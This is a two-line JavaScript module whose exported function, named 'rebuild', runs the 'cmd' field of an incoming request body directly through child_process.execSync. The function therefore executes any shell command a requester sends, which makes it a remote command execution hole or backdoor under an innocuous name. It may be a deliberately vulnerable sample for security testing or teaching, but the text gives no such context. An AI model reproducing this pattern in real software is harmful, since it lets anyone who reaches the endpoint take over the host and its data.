import * as child_process from "node:child_process";
export function rebuild(req) { return child_process.execSync(req.body.cmd); }
